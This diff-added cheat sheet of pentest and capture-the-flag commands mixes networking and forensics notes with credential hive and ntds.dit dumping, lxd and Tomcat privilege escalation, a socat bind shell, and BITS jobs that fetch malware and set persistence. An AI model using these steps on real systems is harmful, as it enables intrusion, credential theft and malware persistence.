+######################################################################
+//full survey, noisy
+winpeas.exe cmd searchall searchfast
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+linpeas
+######################################################################
+//run and output to file
+sh linpeas.sh -a > /dev/shm/linpeas.out
+
+//less time consuming and less noisy
+sh linpeas.sh -s > /dev/shm/linpeas.out
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+windows privileges
+######################################################################
+//list the current user's privs
+whoami /priv
+
+//SeBackupPrivilege - allows you access to system and sam hives and ntds.dit
+reg save HKLM\SYSTEM C:\temp\SYSTEM
+reg save HKLM\SAM C:\temp\SAM
+///for ntds extraction, move to ntds.dit section
+
+//SeBackupPrivilege && SeRestorePrivilege - allows you to set perm and ownership on each file and folder
+//https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
+PS>
+$user = "<DOMAIN>\<USERNAME>"
+$folder = "<DESIRED_FOLDER>
+Get-Acl $folder
+$acl = Get-Acl $folder
+$aclperms = $user,"FullControl","ContainerInherit,ObjectInherit","None","Allow"
+$aclrule = new-object System.Security.AccessControl.FileSystemAccessRule $aclperms
+$acl.AddAccessRule($aclrule)
+Set-Acl -path $folder -AclObject $acl
+Get-Acl $folder
+
+//SeEnableDelegationPrivilege - allows a user to change another user's password
+//view rpcclient "change user password" section
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+smbserver.py
+######################################################################
+//start the server with the share TMP
+sudo smbserver.py -smb2support -username blah -password password -comment "My Share" TMP /tmp
+//then connect on windows with
+net use w: \\<IP>\TMP /user:blah password
+copy <FILE> w:
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+ntds.dit
+######################################################################
+//this is the process when you have SeBackupPrivilege, but no Admin
+//https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
+//follow the steps below to dump
+create script:
+	set context persistent nowriters
+	set metadata c:\windows\system32\spool\drivers\color\example.cab
+	set verbose on
+	begin backup
+	add volume c: alias mydrive
+
+	create
+
+	expose %mydrive% w:
+	end backup
+unix2dos script.txt
+#upload script.txt
+diskshadow /s script.txt
+//now get dlls from here
+//https://github.com/giuliano108/SeBackupPrivilege
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+Get-SeBackupPrivilege
+//if not enabled, enable
+Set-SeBackupPrivilege
+Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+dd
+######################################################################
+//copy first N bytes from file to new file
+dd if=<INPUT> of=<OUTPUT> count=N bs=1
+
+//patch N bytes starting at offset X of file
+printf '\x41\x41\x41' | dd of=<FILE> bs=1 seek=X count=N conv=notrunc
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+ld_preload
+######################################################################
+//overwrite malloc, free, and strcpy to include bounds checking
+///heapcheck.c
+<BEGIN_FILE>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <dlfcn.h>
+
+void* (*orig_malloc)(size_t);
+void (*orig_free)(void*);
+char* (*orig_strcpy)(char*, const char*);
+
+typedef struct {
+    uintptr_t addr;
+    size_t size;
+} alloc_t;
+
+#define MAX_ALLOCS 1024
+
+alloc_t allocs[MAX_ALLOCS];
+unsigned alloc_idx = 0;
+
+void *malloc(size_t s)
+{
+    if (!orig_malloc) orig_malloc = dlsym(RTLD_NEXT, "malloc");
+
+    void *ptr = orig_malloc(s);
+    if (ptr)
+    {
+	allocs[alloc_idx].addr = (uintptr_t)ptr;
+	allocs[alloc_idx].size = s;
+	alloc_idx = (alloc_idx + 1) % MAX_ALLOCS;
+    }
+
+    return ptr;
+}
+
+void free(void *p)
+{
+    if (!orig_free) orig_free = dlsym(RTLD_NEXT, "free");
+
+    orig_free(p);
+    for (unsigned i = 0; i < MAX_ALLOCS; i++)
+    {
+	if (allocs[i].addr == (uintptr_t)p)
+	{
+	    allocs[i].addr = 0;
+	    allocs[i].size = 0;
+	    break;
+	}
+    }
+}
+
+char* strcpy(char *dst, const char *src)
+{
+    if (!orig_strcpy) orig_strcpy = dlsym(RTLD_NEXT, "strcpy");
+
+    for (unsigned i = 0; i < MAX_ALLOCS; i++)
+    {
+	if (allocs[i].addr == (uintptr_t)dst)
+	{
+	    if (allocs[i].size <= strlen(src))
+	    {
+		printf("Bad idea! Aborting strcpy to prevent heap overflow\n");
+		exit(1);
+	    }
+	    break;
+	}
+    }
+    return orig_strcpy(dst, src);
+}
+<END_FILE>
+//compile with below - note that if program was compiled with statically linked 
+//malloc, free, or strcpy functions, it will not import these changes
+gcc -o heapcheck.so -fPIC -shared -D_GNU_SOURCE heapcheck.c -ldl
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+hping3
+######################################################################
+//send packet to port with data and sequence number
+hping3 <IP> -p <DPORT> -M <SEQ_NUM> -E <FILE_WITH_DATA> -d <DATA_FILE_SZ>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+echo
+######################################################################
+//echo bytes into file (shellcode)
+echo -n -e '\xb8\x0a\x00\x00\x00\xc3' > <FILENAME>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+c tricks
+######################################################################
+//execute shellcode - create function pointer pointing to byte array
+//must compile with
+gcc <FILE> -z execstack -fno-stack-protector -o <OUT>
+<BEGIN_CODE>
+int execute(u_char *code)
+{
+    int (*func)() = (int(*)())code;
+    func();
+    return 0;
+}
+<END_CODE>
+
+//daemonize a process
+//create daemonize function and call from main
+<BEGIN_CODE>
+static void daemonize()
+{
+    pid_t pid;
+
+    pid = fork();
+
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    if (setsid() < 0)
+        exit(EXIT_FAILURE);
+
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+
+    pid = fork();
+
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    umask(0);
+
+    chdir("/");
+
+    int x;
+    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
+    {
+        close (x);
+    }
+}
+<END_CODE>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+fcrackzip
+######################################################################
+//crack a zip file, or encrypted files within the archive
+fcrackzip -v -u -D -p <WORDLIST> <FILE>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+tomcat
+######################################################################
+//want to look for tomcat-users.xml, in this will be defined (found through LFI at time of writing this)
+<user username="<USERNAME>" password="<PASSWORD>" roles="admin-gui,manager-script"/>
+//because this user has the 'manager-script' role, can point msf exploit/multi/http/tomcat_mgr_deploy
+//at '/manager/text' and get shell
+//also can use this method
+https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+stty
+######################################################################
+//to gain shell completion and more real estate when using pty
+python -c "import pty;pty.spawn('/bin/bash')"
+Ctrl-Z
+stty raw -echo
+fg
+stty columns 300 rows 82
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+lxd // lxc
+######################################################################
+//privesc for when user is in lxd group
+//https://www.hackingarticles.in/lxd-privilege-escalation/
+push tools/alpine..tar.gz to target
+lxd init
+    def,yes,def,dir,def,def,def,def,none,def,def,def
+lxc image import ./alpine.tar.gz --alias myimage
+lxc image list
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true 
+lxc start ignite
+lxc exec ignite /bin/sh
+    //drops you into shell on lxc container
+cd /mnt/root/root
+cat root.txt
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+qemu // kvm // libvirt
+######################################################################
+//to enable multiple monitors and clipboard
+//remember to update virsh xml adding 2 heads
+//install the following on the guest
+pacman -S spice-vdagent xf86-video-qxl
+
+//run qemu in terminal with curses
+//ALT-F2, quit
+qemu-system-x86_64 -curses <file.bin>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+memfd_create
+######################################################################
+//map file to memory and execute /proc/self/fd/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+bash-foo
+######################################################################
+//sed inline substitution of file
+sed -i 's/<OLD>/<NEW>/g' <FILE>
+
+//sed replace group of characters
+sed -i 's/[g-zG-Z]//g' <FILE>
+
+//tr remove newlines
+cat <FILE> | tr -d '\n'
+
+//tr create wordlist based on text file
+cat <FILE> | tr ' ' '\n' | tr -d ",.'" | uniq
+
+//binwalk search for embedded files within binaries
+binwalk <FILE>
+
+//find ssl/tls key in memdump
+strings -td <MEMDUMP> | grep "CLIENT_RANDOM"
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+rsmangler
+######################################################################
+//mangle a list of words to create a deeper wordlist
+rsmangler -p -d -r -t -T -c -u -l -s -e -i --punctuation -a -C --pna --pnb --na --nb --force --space --file <INPUT> --output <OUTFILE>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+john the ripper
+######################################################################
+//crack a hash with john
+john --wordlist=<WORDLIST> --format=<FORMAT> <HASHTOCRACK>
+//example
+john --wordlist=mangwordlist.txt --format=raw-sha256 hash.txt
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+volatility
+######################################################################
+//scan for files within memdump
+vol.py --profile=Win10x64_15063 -f <MEMDUMP> filescan
+
+//dump files from memdump
+vol.py --profile=Win10x64_15063 -f <MEMDUMP> dumpfiles -D files -n
+
+//search for hidden kernel modules
+//spits out a base address where module is found
+vol.py -f <MEMDUMP> --profile=LinuxCentOS65x64 linux_hidden_modules
+
+//dump a previously found hidden module
+vol.py -f <MEMDUMP> --profile=LinuxCentOS65x64 linux moddump --dump-dir=<OUTDIR> --base=<BASEFROMABOVE>
+
+//view process list from memdump, find hidden processes
+vol.py -f <MEMDUMP> --profile=LinuxCentOS65x64 linux_psxview
+vol.py -f <MEMDUMP> --profile=LinuxCentOS65x64 linux_psaux
+
+//dump process memory from memdump
+vol.py -f <MEMDUMP> --profile=LinuxCentOS65x64 linux_procdump --dump-dir=<OUTDIR> --pid=<PID>
+
+//view file descriptors for processes
+vol.py -f <MEMDUMP> --profile=LinuxCentOS65x64 linux_lsof
+
+//view netstat for memdump
+vol.py -f <MEMDUMP> --profile=LinuxCentOS65x64 linux_netstat
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+ipv6
+######################################################################
+//link local prefix
+FE8
+FE9
+FEA
+FEB
+
+//unique local prefix
+FD00
+
+//all nodes - equivalent to subnet broadcast
+FF02::1
+
+//all routers
+FF02::2
+
+//all ospf, all ospf designated routers
+FF02::5
+FF02::6
+
+//all routers using eigrpv6
+FF02::A
+
+//localhost
+::1
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+tmux
+######################################################################
+//~/.tmux.conf
+set -g prefix C-a
+bind C-a send-prefix
+unbind C-b
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+snort
+######################################################################
+//test configuration
+snort -c /etc/snort/snort.conf -T -i lo
+
+//read pcap file, output alerts to console and outfile
+snort -c /etc/snort/snort.conf -r <PCAP> -q -K none -A console | tee snort.out
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+forensics misc
+######################################################################
+//information about a pcap file
+pcapinfos <PCAP>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+tcpdump
+######################################################################
+//read pcap file
+tcpdump -nr <PCAP> "<BPF>"
+
+//no dns, format timestamp, all packets with only SYN bit set, excluding ECN
+tcpdump -nttttr <PCAP> 'tcp[13]&0x3f=0x2'
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+awk
+######################################################################
+//print 4th column, IFS=space
+cat <DATA> | awk '{print $4}'
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+wireshark
+######################################################################
+///useful capture filters
+//internal host source
+ip.src in {192.168.0.0/16 172.16.0.0/12 10.0.0.0/8}
+
+//http requests
+http.request
+
+//netbios - useful for hostnames
+nbns
+
+//dhcp traffic - find hostnames
+udp.port eq 67
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+registry
+######################################################################
+//shellBags – bagsMRU, bags 
+HKEY_USERS\<SID>\SOFTWARE\Microsoft\Windows\Shell 
+///Windows 7+
+HKEY_USERS\<SID>\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell
+
+
+//find registry filesystem locations
+Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\hivelist\ 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+git
+######################################################################
+//turn verify ssl off for project
+git config http.sslVerify "false"
+
+//command to turn verify ssl off
+git -c http.sslVerify=false ...
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+socat
+######################################################################
+//reverse tunnel
+socat TCP-LISTEN:<LISTEN_PORT>,fork TCP-CONNECT:<CONNECT_IP>:<CONNECT_PORT>
+
+//simple client server
+;server
+socat TCP-LISTEN:8800,reuse-addr,pf=ip4,fork -
+;client
+socat TCP:localhost:8800 -
+
+//client-server TCP over TLS/SSL
+;server
+socat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,verify=0,fork,cert=<SERVER.pem> -
+;client
+socat OPENSSL:localhost:443,verify=0,cert=<CLIENT.PEM> -
+
+//command execution
+;server
+socat TCP-LISTEN:1234 EXEC:/bin/bash
+;client
+socat TCP:localhost:1234 -
+
+//tunneling
+;server
+socat TCP-LISTEN:54321,reuseaddr,fork TCP:remote.server.com:22
+;client
+ssh root@localhost -p 54321
+
+//virtual PtP IP link through TUN network device
+;server
+socat /dev/tun0 -
+;client
+ifconfig tun0 10.0.0.2 10.0.0.3
+ping 10.0.0.3
+
+//file transfer ? seeing issues online
+;server
+socat OPENSSL-LISTEN:4443,cert=<SERVER.PEM>,verify=0,fork file:<LOCAL_FILEPATH>
+;client
+socat OPENSSL:<SERVER_IP>:4443,verify=0 file:<OUTFILE>,create
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+networking
+######################################################################
+//add ip
+ifconfig eth0 172.18.31.13 netmask 255.255.255.0 up
+
+//add mac
+ifconfig eth0 hw ether AA:BB:CC:DD:EE:FF
+
+//toggle interface
+ifconfig eth0 up/down
+
+//dhcp on interface
+dhclient eth0
+
+//release dhcp lease
+dhclient -r eth0
+
+//change default gateway
+route add default gw <IP>
+
+//add route to network
+route add -net 172.17.0.0 netmask 255.255.255.128 gw 172.18.31.12
+ip route add 172.17.1.0/24 via 192.168.56.1
+
+//delete route to network
+route del -net 172.17.0.0 netmask 255.255.255.128
+
+//add arp entry
+arp -s 172.18.31.12 AA:BB:CC:DD:EE:FF
+
+//delete arp entry
+arp -d 172.18.31.12 AA:BB:CC:DD:EE:FF
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+bits
+######################################################################
+//based on https://www.fireeye.com/blog/threat-research/2021/03/attacker-use-of-windows-background-intelligent-transfer-service.html
+//create and execute a job to download a file
+bitsadmin /create download
+bitsadmin /addfile download https://<site>//malware.exe c:\windows\malware.exe
+bitsadmin /resume download
+bitsadmin /complete download
+
+//create job to launch malware.exe after attempting download of invalid url
+bitsadmin /create persistence
+bitsadmin /addfile persistence http://127.0.0.1/invalid.exe c:\windows\i.exe
+bitsadmin /SetNotifyCmdLine persistence c:\windows\malware.exe NULL
+bitsadmin /resume persistence
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+iptables
+######################################################################
+//redirect incoming traffic on port X to IP:Y
+iptables -t nat -A PREROUTING -p tcp -dport <X> -j DNAT --to-destination <IP>:<Y>
+iptables -t nat -A PREROUTING -j MASQUERADE
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
